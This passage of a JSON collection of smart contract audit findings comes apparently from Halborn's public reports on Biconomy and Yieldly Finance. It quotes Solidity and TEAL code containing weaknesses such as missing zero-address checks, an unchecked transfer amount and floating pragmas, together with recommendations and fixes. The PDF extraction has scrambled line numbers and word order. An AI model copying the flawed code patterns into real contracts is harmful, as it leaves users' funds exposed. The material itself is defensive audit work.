chainIdToName [97] = \" binance \" ; chainIdToName [3] = \" Ethereum \" ; chainIdToName [4002] = \" Fantom \"; chainIdToName [1287] = \" Moonbeam \" ; 28 78 79 } chainIdToName [80001] = \" Polygon \" ; Risk Level: Likelihood - 3 Impact - 2 Recommendation: Validate that necessary address inputs are different from zero. Remediation Plan: SOLVED: The Biconomy team implemented verifications to check if the parameters in the constructor are equal to address(0). 29 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: Low"
        ]
    },
    {
        "title": "DIFFERENT PRAGMA VERSIONS USED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The CCMP smart contracts use floating pragma and different pragma versions, like >=0.6.11. Latest pragma version 0.8.16 released on August 8th, 2022, is used in some contracts, but 0.8.0 is also used. Avoid using floating pragma is recommended as best practices. Reference: Solidity Releases Code Location:  >=0.6.11 (contracts/adaptors/base/AbacusConnectionClient.sol#2)  ^0.8.0 (contracts/gateway/facets/DiamondInit.sol#2)  ^0.8.0 (contracts/gateway/facets/DiamondLoupeFacet.sol#2)  ^0.8.0 (contracts/interfaces/IAxelarGateway.sol#3)  ^0.8.0 (contracts/interfaces/ICCMPGateway.sol#2)  0.8.16 (contracts/interfaces/ICCMPRouterAdaptor.sol#2)  ^0.8.0 (contracts/interfaces/IDiamond.sol#2)  ^0.8.0 (contracts/interfaces/IDiamondCut.sol#2)  ^0.8.0 (contracts/interfaces/IDiamondLoupe.sol#2)  ^0.8.0 (contracts/interfaces/IERC165.sol#2)  ^0.8.0 (contracts/interfaces/IERC173.sol#2)  ^0.8.0 (contracts/interfaces/IWormhole.sol#4)  ^0.8.16 (contracts/libraries/LibDiamond.sol#2)  ^0.8.0 (contracts/mock/MockWormhole.sol#4)  ^0.8.0 (contracts/structures/CrossChainMessage.sol#2)  ^0.8.0 (contracts/structures/Wormhole.sol#4) Note: The contracts with version 0.8.16 are not shown in the list. 30 Risk Level: Likelihood - 2 Impact - 1 Recommendation: It is recommended to update the pragma versions used in the CCMP smart contracts and lock them on the used version 0.8.16. Remediation Plan: SOLVED: The Biconomy team now uses Solidity version 0.8.16 in their contracts. 31 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "GAS OPTIMIZATIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The Pausable.sol contract contains several functions that could be marked as external instead of public in order to save gas. Listing 15: Pausable.sol function changePauser ( address newPauser ) public onlyPauser 58  whenNotPaused { 59 60 } _changePauser ( newPauser ); Listing 16: Pausable.sol 77 78 79 80 81 82 83 function pause () public onlyPauser { _pause () ; } function unpause () public onlyPauser { _unpause () ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to change the public visibility of the mentioned functions to external to save gas. 32 Remediation Plan: SOLVED: The Biconomy team implemented the mentioned functions as external instead of public. 33 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "OPEN TODOs",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Open To-dos can point to architecture or programming issues that still need to be resolved. Often these kinds of comments indicate areas of complexity or confusion for developers. This provides value and insight to an attacker who aims to cause damage to the protocol. Code Location: TO-DO: Listing 17: Open ToDOs 1 CCMPReceiverMessageFacet . sol # L1 2 CrossChainMessage . sol # L7 3 CrossChainMessage . sol # L53 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider resolving the To-dos before deploying code to a production context. Use an independent issue tracker or other project management software to track development tasks. Remediation Plan: ACKNOWLEDGED: The Biconomy team acknowledged this finding. 34 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "INCREASE OPTIMIZER RUNS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_Cross_Chain_Messaging_Protocol_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Solidity 0.8.2 and 0.8.16 have good optimizers that save a gas when compiling to bytecode. The team can use it by increasing the number of runs to something like 2000 at least in the config. Risk Level: Likelihood - 1 Impact - 1 Code Location: Listing 18: hsrdhat.config.ts (Lines 27,41) compilers : [ { 15 solidity : { 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 }, { }, version : \" 0.8.2 \" , settings : { outputSelection : { \"* \" : { \" *\" : [ \" storageLayout \" ], }, }, optimizer : { enabled : true , runs : 200 , }, version : \" 0.8.16 \" , settings : { outputSelection : { \"* \" : { 35 \" *\" : [ \" storageLayout \" ], }, }, optimizer : { enabled : true , runs : 200 , }, viaIR : true , 36 37 38 39 40 41 42 43 44 45 46 47 }, }, ], }, Recommendation: Consider increasing optimizer runs. Remediation Plan: SOLVED: The Biconomy team has set the compiler optimizer to 2000 runs. 36 ",
        "labels": [
            "Halborn",
            "Biconomy_Cross_Chain_Messaging_Protocol",
            "Severity: Informational"
        ]
    },
    {
        "title": "REWARDS ARE NOT UPDATED AFTER THE STAKE/WITHDRAW PROCESSES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the stake or withdraw progress, update rewards function not called by a user. According to Rewards-Unlocked variable, Pool-Amount is up- dated. Code Location: Listing 1 1 update_rewards : 2 // Set last updated to this timestamp 3 byte \" Last_Updated \" 4 global LatestTimestamp 5 itob 6 app_global_put 7 8 // Calculates the amount of rewards to be unlocked 9 // Eqn : (((( End - Start ) - ( End - Current ) ) / ( End - Start ) ) * // \" Last_Updated \" // \" Last_Updated \" LatestTimestamp // null Rewards_Locked ) - Rewards_Unlocked 10 // Justification : Allows for dynamic calculation of reward unlocks after end date or start date is 11 // shifted 12 13 global LatestTimestamp 14 itob 15 byte \" End_Date \" 16 app_global_get 17 b >= 18 bz setTimeStamp 19 20 byte \" End_Date \" 21 app_global_get 22 store 13 23 // LatestTimestamp // LatestTimestamp \" End_Date \" // LatestTimestamp intx // 1||0 // null ( if 0 goto setTimeStamp ) // \" End_Date \" // intx // null 14 Recommendation: Consider updating rewards amount after stake or withdraw processes. Remediation Plan: SOLVED - Yieldly.Finance claims that It is executed during noop operations that are specified as user interactions, which includes staking/withdraw- ing, and admin interactions such as emergency withdrawing. 15 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Medium"
        ]
    },
    {
        "title": "LACK OF TEST CASE ON THE UPDATE REWARDS FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the dynamic tests, It has been observed that update rewards func- The tests cases should be added into tion has lack of test cases. repository. Code Location: Listing 2: Update Rewards Function 1 update_rewards : 2 // Set last updated to this timestamp 3 byte \" Last_Updated \" 4 global LatestTimestamp 5 itob 6 app_global_put 7 8 // Calculates the amount of rewards to be unlocked 9 // Eqn : (((( End - Start ) - ( End - Current ) ) / ( End - Start ) ) * // \" Last_Updated \" // \" Last_Updated \" LatestTimestamp // null Rewards_Locked ) - Rewards_Unlocked 10 // Justification : Allows for dynamic calculation of reward unlocks after end date or start date is 11 // shifted 12 13 global LatestTimestamp 14 itob 15 byte \" End_Date \" 16 app_global_get 17 b >= 18 bz setTimeStamp 19 20 byte \" End_Date \" 21 app_global_get 22 store 13 // LatestTimestamp // LatestTimestamp \" End_Date \" // LatestTimestamp intx // 1||0 // null ( if 0 goto setTimeStamp ) // \" End_Date \" // intx // null 16 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Ensure that update rewards functionality is working according to workflow. Remediation Plan: SOLVED - Yieldly.Finance added the necessary test cases into the repos- itory. 17 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING EMERGENCY WITHDRAW FUNCTION FOR THE USERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the dynamic tests, It has been observed that only admin can call emergency withdraw functions. The user could not call emergency withdraw function for their funds. Code Location: Listing 3: Admin Only Function 1 emerg_withdraw : 2 global GroupSize 3 int 1 4 == 5 assert 6 7 callsub admin_check // GroupSize // GroupSize intx // 1||0 // null ( if 0 then Failed ) // goto admin_check Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to review structure and allows the user to withdraw their funds when the emergency status is occurred. Remediation Plan: ACKNOWLEDGED - Yieldly.Finance claims that the behavior is intended. 18 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "AFTER THE POOL RATIO UPDATE THE USER CLAIMABLES ARE NOT UPDATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the static analysis, It has been observed that when pool ra- tio is updated, the user claimable are not updated on the withdrawal functionality. Code Location: Listing 4: Commented Out Function 1 // Update New Pool Ratio 2 callsub update_pool_ratio 3 4 // // Update claimable amount 5 // callsub update_user_claimable // goto update_pool_ratio // goto update_user_claimable Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider activating update_user_claimable function. Remediation Plan: ACKNOWLEDGED - Yieldly.Finance added the function only for testing pur- pose. 19 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF START DATE CHECK ON THE POOL CREATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the dynamic testing, It has been seen that start_Date variable is not checked. When the new pool is created, Start-Date should be equal or more than the Latest Timestamp. Code Location: Listing 5: Start Date Has Not Been Checked 1 byte \" Admin \" 2 txn Sender 3 app_global_put 4 5 // * Pool Dates */ 6 byte \" Start_Date \" 7 txn ApplicationArgs 0 8 app_global_put 9 10 byte \" End_Date \" 11 txn ApplicationArgs 1 12 app_global_put // \" Admin \" // \" Admin \" Sender // null // \" Start_Date \" // \" Start_Date \" ApplicationArgs // null // \" Start_Date \" // \" Start_Date \" ApplicationArgs // null Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider to check start date is more than the latest timestamp. 20 Remediation Plan: PENDING: Yieldly.Finance will fix the vulnerability on the future release. 21 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF MULTISIG PROGRAM",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The principal benefit of multi-signature is that it creates added redun- dancy in key management. While single signature addresses require only a single key for transactions, multi-signature addresses require multiple keys. To protect against malicious admin, it may be necessary to use a multi signature. By using this mechanism, a malicious admin actions could be prevented. Code Location: 22 Example Definition: Listing 6: Multisig Implementation 2 goal account multisig new -T 2 account1 account2 account3 -d ~/ node / data 3 goal clerk multisig signprogram -p / tmp /* . teal -a account1 -A account2 -o / tmp / simple . lsig -d ~/ node / data Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the contract, the multi-signature should be implemented over a creator account. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance considers to use multi-signature on the mainnet deployment. 23 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING PROXY ASSET DEFINITION ON THE FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the Yieldly.Finance workflow, Escrow connection is made with a proxy contract. According to documentation, Escrow only allows transactions tied with proxy. But, in some functions, transactions dont go through the Proxy asset. Code Location: Listing 7: winnerProgram Function (Lines 1) 1 2 3 4 5 6 7 8 9 let txn = await configs . winnerProgram ( account2 , escrowAddress , algoAppId , asaAppId , trackerAppId , winner , rateAppId ); Listing 8: assetOptoutApplication Function (Lines 1) 1 2 3 4 5 6 let txn1 = await configs . assetOptoutApplication ( account1 , escrowAddress , optingAppId , assetId ); 24 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to construct transactions through a proxy which is interacting with escrow. Remediation Plan: NOT APPLICABLE: Yieldly.Finance does not need to use proxy for the escrow asset after program version (5). 25 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING FREEZE/REVOKE ASSETS DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Algorand Smart Contract Audit/Yieldly_Finance_Compound_Algorand_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When an asset is created, the contract can provide a freeze address and a default frozen state. If the default frozen state is set to true the corresponding freeze address must issue unfreeze transactions, one per account, to allow trading of the asset to and from that account. This may be useful in situations that require holders of the asset to pass certain checks before ownership. (KYC/AML) The clawback address, if specified, can revoke the asset from any account and place them in any other account that has previously opted-in. This may be useful in situations where a holder of the asset breaches some set of terms that you established for that asset. You could issue a freeze transaction to investigate, and if you determine that they can no longer own the asset, you could revoke the assets. 26 Asset Explorer: Risk Level: Likelihood - 1 Impact - 1 Recommendation: According to workflow, the application should activate freeze and revoke assets. If the application would rather ensure to asset holders that the application will never have the ability to revoke or freeze assets, set the clawback/freeze address to null. Remediation Plan: ACKNOWLEDGED: Yieldly.Finance does not need to use revoke or freeze feature on the assets. The Revoke and Freeze addresses disabled. 27 THANK YOU FOR CHOOSING",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Compound_Algorand",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF AMOUNT CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "In the Yieldly.Finance workflow, the function transferFunds utilizes user-supplied amount parameter to calculate the purchased amount of The contract however does not verify the amount transferProposals. actually paid to be equal to what the user declared. Vault contract transferFunds method is missing amount check. Although, Only The dis- patcher can access the function, Lack of amount check still poses a risk. the function transferFunds Yieldly.Finance OpenZeppelins In transfer to handle the token transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious dispatcher can pay with a custom ERC20 token with the transfer function modified in such a way that it does not update balances at all. uses Code Location: Vault.sol Line #~37 Listing 1: Vault.sol (Lines 37) 37 38 39 40 41 42 function transferFunds ( address _tokenAddress , address _recipient , uint256 _amount ) public onlyDispatcher { require ( tokensStore [ _tokenAddress ]. active == true , \" Token not supported \"); require ( _amount > 0, \" Cannot transfer 0 tokens \"); ERC20 ( _tokenAddress ). transfer ( _recipient , _amount ); emit ReleasedFundsEvent ( _recipient , _amount ); } 15 Risk Level: Likelihood - 2 Impact - 4 Recommendation: It would be safer to perform additional validation before assigning user- supplied values on contracts. Transfer amount should be checked on the related function even though there is an access control check. Remediation Plan: RISK ACCEPTED: The bridge transfers tokens out of the vault upon validation from the dispatcher. Any tokens that the bridge supports are added by Yieldly.Finance Team and audited. There is only one dispatcher in the contract that is calling this function. There is also no payment being made to the vault on the ethereum side. From that reasons, Yieldly.Finance Team has decided to continue without amount validation. 16 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Medium"
        ]
    },
    {
        "title": "INTEGER OVERFLOW",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. For instance, in Dispatcher.sol the proposeNewTxn method is incrementing the number of proposal per transfer and may end up overflowing the integer since the resulting value is not checked to be lower than max allowed (232 -1). In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Dispatcher.sol Line #149 Listing 2: Dispatcher.sol (Lines 149) 131 function proposeNewTxn ( address _userAddress , address _tokenAddress , uint256 _amount , string memory _note ) public 132 133 134 135 136 137 138 139 140 onlyBridgeController { transferProposalStore [ uuid ]. recipientAddress = _userAddress ; transferProposalStore [ uuid ]. amount = _amount ; transferProposalStore [ uuid ]. tokenAddress = _tokenAddress ; transferProposalStore [ uuid ]. note = _note ; if ( valThreshold == 1) { vault . transferFunds ( transferProposalStore [ uuid ]. tokenAddress , transferProposalStore [ uuid ]. recipientAddress , transferProposalStore [ uuid ]. amount ); emit ApprovedTransaction ( transferProposalStore [ uuid ]. recipientAddress , transferProposalStore [ uuid ]. amount , uuid ); emit proposalCreated ( uuid ); 17 141 142 143 144 145 146 147 148 149 150 transferProposalStore [ uuid ]. signed = true ; } else { transferProposalStore [ uuid ]. signatures . push ( msg . sender ); outstandingTransferProposalsIndex . push ( uuid ); emit proposalCreated ( uuid ); } uuid += 1; } Dispatcher.sol Line #120 Listing 3: Dispatcher.sol (Lines 120) 110 function removeValidator ( address _validatorAddress ) public onlyMultiSig { 111 112 113 114 115 116 117 118 119 120 121 122 // Remove a validator threshold count in order to avoid not having enough validators for ( uint256 i = 0; i <= validators . length ; i ++) { if ( validators [ i] == _validatorAddress ) { validators [i ] = validators [ validators . length - 1]; validators . pop () ; if ( valThreshold > 1) { valThreshold = valThreshold - 1; } ... VaultMultiSig.sol Line #93-108 Listing 4: VaultMultiSig.sol (Lines 93) 88 89 90 91 92 function proposeAddress ( address _address , uint256 _index ) public onlyOwner { addressProposalStore [ uuid ]. proposal = _address ; addressProposalStore [ uuid ]. proposalType = _index ; addressProposalStore [ uuid ]. timeStamp = block . timestamp ; outstandingAddressProposalsIndex . push ( uuid ); 18 uuid += 1; 93 94 95 } ... VaultMultiSig.sol Line #137 Listing 5: VaultMultiSig.sol (Lines 138) 132 133 134 135 136 137 138 139 140 141 142 143 144 ... if ( addressProposalStore [ _proposal ]. signatures . length >= threshold ) { addressProposalStore [ _proposal ]. signed = true ; // Remove a threshold count in order to avoid not having enough signatories if ( threshold > 1) { threshold = threshold - 1; } removeSignatory ( addressProposalStore [ _proposal ]. proposal ); popAddressProposal ( _proposal ); emit RemovedSignatory ( addressProposalStore [ _proposal ]. proposal ); } ... Risk Level: Likelihood - 3 Impact - 3 Recommendation: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system. 19 Remediation Plan: SOLVED: In the proposeAddress and proposeNewTxn function, the UUID pa- rameter is appended once per the proposition of a new transaction. UUID parameter defined as a uint256 - 2*256-1. The max amount of transactions that are required in order to overflow the unique identifier. Therefore, the overflow and underflow are not practically possible. In the other hand, the threshold variable is set by a signatories. Due The low bound of threshold variable is checked on the function. to this implementation, the underflow is not possible. From the code pieces below, we can clearly see the function is only accessible from The signatories. overflow also is not possible practically. Also, the threshold parameter defined as uint256. Listing 6: DispatcherMultiSig.sol (Lines 211,212) 206 207 208 209 210 211 212 213 214 215 function approveNewThreshold ( uint256 _proposal ) external onlySignatories oneVoteThreshold ( _proposal ){ require ( thresholdProposalStore [ _proposal ]. signed == false , \" Already Signed \"); require ( thresholdProposalStore [ _proposal ]. proposal <= signatories . length , \" Can 't be less signatories than threshold \" ); thresholdProposalStore [ _proposal ]. signatures . push ( msg . sender ); if ( thresholdProposalStore [ _proposal ]. signatures . length >= threshold ) { threshold = thresholdProposalStore [ _proposal ]. proposal ; popThresholdProposal ( _proposal ); emit ApprovedNewThreshold ( thresholdProposalStore [ _proposal ]. proposal ); } 0.8.0 and later versions include native overflow and underflow checks that used to require the SafeMath lib or custom checks to avoid. Yieldly .Finance Team will use Pragma 0.8.4 therefore, safety mechanisms will be activated. 20 Listing 7: Dispatcher.sol (Lines 1) 1 pragma solidity 0.8.4; 2 import \" ./ Vault . sol \" ; 3 import \" ./ openzeppelin_contracts / access / Ownable . sol \"; 4 import \" ./ openzeppelin_contracts / token / ERC20 / ERC20 . sol \"; 21 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ADDRESS VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "In the Yieldly.Finance - Vault contract is missing a safety check in- side their constructors and multiple functions. Setters of address type parameters should include a zero-address check otherwise contract func- tionality may become inaccessible or tokens burnt forever. Code Location: Vault.sol Line #~18 Listing 8: Vault.sol (Lines 19) 18 19 20 constructor ( address _multiSigAddress ) Ownable () { multiSigAddress = _multiSigAddress ; } Dispatcher.sol Line #~34-36 Listing 9: Dispatcher.sol (Lines 34,35,36) 33 constructor ( address _vaultAddress , address _multiSigAddress ) Ownable () { 34 35 36 37 } multiSigAddress = _multiSigAddress ; vault = Vault ( _vaultAddress ); bridgeControllerAddress = msg . sender ; Risk Level: Likelihood - 2 Impact - 2 22 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: Listing 10: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract address \" ); _; } Remediation Plan: SOLVED: Yieldly.Finance Team implemented address check on the related contracts. Listing 11: Vault.sol (Lines 19) 18 19 20 21 constructor ( address _multiSigAddress ) Ownable () { require ( _multiSigAddress != address (0) , \" Cannot set address to 0 \" ); multiSigAddress = _multiSigAddress ; } 23 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Low"
        ]
    },
    {
        "title": "THRESHOLD LIMIT VALIDATION MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "There are multiple roles defined in the Yieldly.Finance. They are named as Signatory, Dispatcher and Validator. Each role has different functions that it can access. In the contracts, No limit has been set on the roles and these roles can have the desired number of people. The maximum value of threshold is not defined in the contracts. Function: Dispatcher.sol Line #~79 Listing 12: Dispatcher.sol (Lines ) 79 80 81 82 83 84 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; emit NewThresholdEvent ( _threshold ); } Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to define threshold limit for validators and signato- ries. 24 Remediation Plan: SOLVED: The maximum value of the threshold is limited by the amount of the validators and signatories. Threshold cannot be greater than the amount of signatories or validators. Therefore, Yieldly.Finance Team included their solutions according to their design. Listing 13: Vault.sol (Lines 19) 80 81 82 83 84 85 86 87 88 89 90 91 function newThreshold ( uint256 _threshold ) external onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; emit NewThresholdEvent ( _threshold ); } function newMultiSig ( address _multiSigAddress ) external onlyMultiSig { require ( _multiSigAddress != address (0) , \" Cannot set address to 0 \" ); multiSigAddress = _multiSigAddress ; emit NewMultiSigEvent ( _multiSigAddress ); } 25 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "Yieldly.Finance contracts use the floating pragma ^0.8.0. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma version that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. Reference: ConsenSys Diligence - Lock pragmas Code Location: Vault.sol - Dispatcher.sol - VaultMultiSig.sol - DispatcherMultiSig.sol Line #2-3 Listing 14: Vault.sol - Dispatcher.sol - VaultMultiSig.sol - Dispatcher- MultiSig.sol (Lines 2) 2 pragma solidity ^0.8.0;  This is an example where the floating pragma is used. ^0.8.0. Risk Level: Likelihood - 2 Impact - 3 Recommendation: Consider lock the pragma version known bugs for the compiler version. Therefore, it is recommended not to use floating pragma in the production. Apart from just locking the pragma version in the code, the sign (>= 26 it is possible locked the pragma fixing the ) need to be removed. version both in truffle-config.js if you use the Truffle framework and in hardhat.config.js if you use HardHat framework for the deployment. truffle-config.js hardhat.config.js Remediation Plan: Yieldly.Finance Team team considers using the pragma version Solved: 0.8.4 for some reasons: - Using the gas improvements from 0.8.2 https://github.com/ethereum/ solidity/releases/tag/v0.8.2 - A medium severity bug found on March 20th that is present with all prior versions of Solidity https://blog.soliditylang.org/2021/03/ 23/keccak-optimizer-bug/ - 0.8.0 and later versions include native overflow and underflow checks that used to require the SafeMath lib or custom checks to avoid. This is a welcome safety improvement that we will want in the accompany- https://blog.soliditylang.org/2020/12/16/solidity-v0.8. ing contracts. 0-release-announcement/ 27 Listing 15: Dispatcher.sol (Lines 1) 1 pragma solidity 0.8.4; 2 import \" ./ Vault . sol \" ; 3 import \" ./ openzeppelin_contracts / access / Ownable . sol \"; 4 import \" ./ openzeppelin_contracts / token / ERC20 / ERC20 . sol \"; 28 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Low"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "The Owner of the contract is usually the account which deploys the As a result, the Owner is able to perform some privileged contract. In the Vault.sol, Dispatcher.sol, DispatcherMultiSig.sol and actions. VaultMultiSig.sol smart contracts, the renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. Function: Risk Level: Likelihood - 2 Impact - 3 29 Recommendation: Its recommended that the Owner is not able to call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. As an other solution, Renounce Ownership functionality can be disabled with the following line. For example: Listing 16: Modifier.sol (Lines 3) 2 3 4 function renounceOwnership () public override onlyOwner { revert ( \" can 't renounceOwnership here \" ); // not possible with this smart contract } Remediation Plan: SOLVED: Yieldly.Finance Team implemented the necessary changes. Listing 17: OpenZeppelin Interface (Lines 2) 1 2 3 4 function renounceOwnership () public virtual onlyOwner { revert ( \" Cannot renounceOwnership with this contract \" ); // not possible for these contracts } 30 ",
        "labels": [
            "Halborn",
            "Yieldly_Finance_Bridge_Ethereum",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENT HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Yieldly_Finance_Bridge_Ethereum_Smart_Contract_Security_Audit_Halborn_v_1_1.pdf",
        "body": "In the Yieldly.Finance contracts the some of functions do not emit event after the progress. Events are a method of informing the transaction initiator about the actions taken by the called function. It logs its emitted parameters in a specific log history, which can be accessed outside of the contract using some filter parameters. Code Location: Dispatcher.sol Line #~83 Listing 18: Dispatcher.sol (Lines ) 79 80 81 82 83 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider as much as possible declaring events at the end of function. Events can be used to detect the end of the operation. For example: 31 Listing 19: EmitThreshold.sol (Lines 5) 1 2 3 4 5 6 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; event NewThreshold ( uint256 newThreshold ); } Remediation Plan: SOLVED: Yieldly.Finance Team added event at the end of function. Listing 20: Dispatcher.sol (Lines 84) 80 81 82 83 84 85 function newThreshold ( uint256 _threshold ) public onlyMultiSig { require ( _threshold <= validators . length , \" Validation threshold cannot exceed amount of validators \"); require ( _threshold > 0, \" Threshold must be greater than 0 \" ); valThreshold = _threshold ; emit NewThresholdEvent ( _threshold ); } 32 ",
        "labels": [
